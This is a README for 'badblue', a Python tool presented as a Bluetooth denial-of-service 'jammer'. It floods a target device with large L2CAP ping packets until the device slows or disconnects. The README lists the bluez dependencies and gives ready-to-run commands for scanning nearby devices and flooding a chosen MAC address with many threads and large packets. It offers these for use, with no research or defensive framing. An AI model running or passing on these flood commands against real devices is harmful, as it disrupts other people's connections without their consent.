# badblue
Annoying bluetooth DoS "jammer" that floods target device with large L2CAP ping packets, causing it to slow down other data transfers or disconnect altogether.

This repo steals heavily from [crypt0b0y's BLUETOOTH-DOS-ATTACK-SCRIPT](https://github.com/crypt0b0y/BLUETOOTH-DOS-ATTACK-SCRIPT).

## Dependencies
This script uses `bluetoothctl` for listing devices and `l2ping` for flooding. Both these utilities are in the `bluez` package.
```bash
sudo apt update
sudo apt install bluez

# verify installation (both should be installed)
bluetoothctl --version
l2ping -h
```

## Usage
List nearby bluetooth devices
```bash
sudo python3 badblue.py list

# you can also specify time to wait for advertisements
sudo python3 badblue.py list --wait-time 8
```

Flood a device
```bash
sudo python3 badblue.py flood 88:AA:BB:CC:DD:EE

# optionally specify number of threads to spawn and size of each ping packet sent
sudo python3 badblue.py --packet-size 300 --threads 500 flood 88:C9:E8:0B:11:1E
```
